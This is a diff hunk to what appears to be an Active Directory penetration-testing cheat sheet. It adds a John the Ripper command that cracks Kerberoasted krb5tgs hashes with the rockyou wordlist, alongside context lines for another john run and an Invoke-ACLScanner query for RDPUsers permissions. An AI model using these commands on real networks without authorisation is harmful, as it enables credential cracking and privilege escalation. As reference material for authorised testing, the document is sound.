@@ -522,6 +522,8 @@ OR to enumerate all users with Kerberos preauth disabled and request a hash auto
 
 ```./john vpn1user.txt --wordlist=wordlist.txt```
 
+```john --wordlist /usr/share/wordlists/rockyou.txt --format=krb5tgs dump```
+
 #### Disabling Pre-Auth
 
 ```Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}```
